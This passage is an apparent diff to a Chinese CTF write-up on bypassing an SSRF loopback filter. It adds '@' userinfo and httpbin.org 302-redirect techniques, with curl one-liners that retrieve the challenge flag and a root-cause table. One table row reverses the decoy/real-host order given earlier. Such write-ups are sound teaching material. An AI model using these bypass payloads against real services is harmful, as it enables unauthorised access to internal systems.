@@ -548,6 +548,89 @@ curl -s -G --data-urlencode "url=http://0.0.0.0:8000/?url=http://example.com" "h
 # → 返回 Example Domain 页面（代理套代理，证明两者是同一进程）
 ```
 
+## 3.5 另外两条绕过路径：`@` userinfo 与 302 重定向链
+
+3.2–3.4 是**路径 A**：逆向过滤器，找「语义等价地址」。这里补充**路径 B**——不与过滤器正面交锋，改从「检查这个环节本身」找盲区：**B1 利用 URL 的 host 归属规则**，**B2 利用校验范围不完整**。两条都不依赖目标系统的具体解析行为，通用性更强。
+
+> 说明：以下两条由另一份 WP 提供，本环境靶机实例已回收，未能二次复测；其原理已在本地用 `urlparse()` 和 `requests` 的签名验证（见各小节末尾）。
+
+### 3.5.1 B1：`@` userinfo 技巧
+
+URL 规范中 `@` **之前是 userinfo（用户名:密码），不是 host**。`urlparse().hostname` 取的是 `@` **之后**的部分，`requests` 连接时用的也是 `@` 之后的部分——两边一致，而过滤器只认 `@` 之后的 host。所以把「真身」放 `@` 后、「诱饵」放 `@` 前即可：
+
+```bash
+# 过滤器看到 hostname = 0.0.0.0 → 通过；requests 也连 0.0.0.0 → 本机
+curl -s -G --data-urlencode "url=http://127.0.0.1@0.0.0.0:8000/api/internal/secret" "http://TARGET/"
+# → n1book{1132e28b5433c878}
+
+# 反向验证：@ 之后是 127.0.0.1 → 被拦，证明 hostname 确实取 @ 之后
+curl -s -G --data-urlencode "url=http://0.0.0.0@127.0.0.1:8000/api/internal/secret" "http://TARGET/"
+# → 127.0.0.1 is forbidden   ❌
+```
+
+```
+http://127.0.0.1 @ 0.0.0.0 :8000/api/internal/secret
+        │           │
+        │           └─ 真正的 host：urlparse 与 requests 都用这里
+        └─ userinfo｜只是诱饵，不参与连接
+
+过滤器: gethostbyname("0.0.0.0") = "0.0.0.0" ≠ "127.0.0.1" → 放行 ✅
+requests: connect(0.0.0.0:8000) → 内核路由到本机 → 🚩
+```
+
+本地 `urlparse()` 验证：
+
+```
+http://127.0.0.1@0.0.0.0:8000/...  → username='127.0.0.1'  hostname='0.0.0.0'    ← 过滤器看这个
+http://0.0.0.0@127.0.0.1:8000/...  → username='0.0.0.0'    hostname='127.0.0.1'  ← 被拦
+```
+
+**通用性**：对几乎所有「用 `urlparse` 取 hostname 再做比对」的过滤器都有效，而且**不需要出网**。
+
+### 3.5.2 B2：302 重定向链（校验只查第一跳）
+
+2.3 节已拿到关键指纹：`requests.get()` **默认跟随重定向**（`allow_redirects=True`）。而过滤器只在 `requests.get` **之前检查一次初始 URL**。于是用一个**外部可控的重定向服务**做跳板——第一跳是合法外网域名（能过检），第二跳才指向内网（过滤器不再介入）：
+
+```bash
+# 初始 URL 是 httpbin.org（合法）→ 302 → 127.0.0.1:8000（内网）
+curl -s -G --data-urlencode "url=http://httpbin.org/redirect-to?url=http://127.0.0.1:8000/api/internal/secret" "http://TARGET/"
+# → n1book{1132e28b5433c878}
+```
+
+```
+http://httpbin.org/redirect-to?url=http://127.0.0.1:8000/api/internal/secret
+        │
+        ▼
+过滤器检查 hostname = "httpbin.org" → 公网 IP ≠ 127.0.0.1 → 通过 ✅
+        │
+        ▼
+requests.get(原 URL) ──► httpbin.org 返回 302
+                          Location: http://127.0.0.1:8000/api/internal/secret
+        │
+        ▼  allow_redirects=True（默认）自动跟随
+GET http://127.0.0.1:8000/api/internal/secret   ← 过滤器【不再介入】
+        │
+        ▼
+      🚩 flag
+```
+
+**根因**：**校验范围不完整**——只校验初始 URL，不复查后续每一跳。
+
+本地验证：`requests.Session.request` 的 `allow_redirects` 默认值确为 `True`。
+
+> **注意：这不是 TOCTOU。** TOCTOU（CWE-367）要求「**同一个对象**先被检查、后被使用，攻击者在时间窗内把它**换成别的**」，本质是竞态。这里检查的是 URL①（httpbin.org），真正打到内网的是 URL②（127.0.0.1）——**URL② 从未进入检查范围**，不存在「被掉包」的对象，302 也是确定性触发、无竞态。真正符合 TOCTOU 的是 **DNS Rebinding**（同一域名在检查与请求之间被换掉解析结果）。两者是兄弟概念：B2 是**校验范围覆盖不到**（遗漏），TOCTOU 是**同一对象被掉包**（竞态），修复方式也不同。
+
+### 3.5.3 路径 A / 路径 B 对比
+
+| 维度 | 路径 A（3.2–3.4：逆向过滤器） | 路径 B（3.5：绕开检查本身） |
+|------|------------------------------|---------------------------|
+| 核心思路 | 理解过滤器实现 → 找语义盲区 | 从「检查」本身找盲区 |
+| 具体手法 | `0.0.0.0` / `0` / `0x0` / `127.0.0.2` | `@` userinfo、302 重定向链 |
+| 依赖 | 无（不需要出网） | B2 需要**出网 egress** + 一个可控的外部重定向服务 |
+| 失效条件 | 过滤器改用 `ipaddress.is_loopback` 做**网段**判断 | B2：`allow_redirects=False` 或每跳复查；B1：正则禁 `@` |
+
+两者**互补而非竞争**：A 回答「黑名单为什么挡不住」，B 回答「检查范围之外还有什么」。实战中两条链同时走，成功率最高。
+
 # 4. 漏洞利用
 
 ## 4.1 最小 PoC — 证明能访问内网 loopback
@@ -570,10 +653,22 @@ n1book{1132e28b5433c878}
 
 ## 4.3 完整一键利用
 
+三条路径任选其一，效果相同：
+
 ```bash
 TARGET="http://20cf525c2a879b2bed3324a0.http-ctf2.dasctf.com"
+
+# ① 路径 A：0.0.0.0（内核路由回本机）—— 本 WP 主打
 curl -s -G --data-urlencode "url=http://0.0.0.0:8000/api/internal/secret" "$TARGET/"
+
+# ② 路径 B1：@ userinfo（诱饵放 @ 前）
+curl -s -G --data-urlencode "url=http://127.0.0.1@0.0.0.0:8000/api/internal/secret" "$TARGET/"
+
+# ③ 路径 B2：302 重定向链（合法外网域名跳内网）
+curl -s -G --data-urlencode "url=http://httpbin.org/redirect-to?url=http://127.0.0.1:8000/api/internal/secret" "$TARGET/"
 ```
+
+三者均返回：`n1book{1132e28b5433c878}`
 
 # 5. Flag
 
@@ -646,6 +741,8 @@ n1book{1132e28b5433c878}
 | 精确等值 vs 网段判断 | 只比 `== "127.0.0.1"`，未判断整个 loopback 网段 | ✅ |
 | 过滤与请求使用不同表示 | 检查用归一化 IP，请求用原始 host | ✅ |
 | 忽视 `0.0.0.0` | 未把 `0.0.0.0` 纳入黑名单 | ✅ |
+| 忽视 `@` userinfo | 未处理 `http://真身@诱饵` 形式（`urlparse` 只取 `@` 之后的 host） | ✅（路径 B1） |
+| 校验范围不完整 | 只查初始 URL，`requests` 默认跟随重定向却不复查每一跳 | ✅（路径 B2） |
 | 未做 DNS Rebinding 防护 | 解析一次后直接用原 host 请求（TOCTOU） | ✅ |
 | 报错信息泄露 | 回显归一化后的 IP，直接暴露过滤器逻辑 | ✅ |
 | 未限制端口 | 可扫描 22/3306/8000 等任意端口 | ✅ |
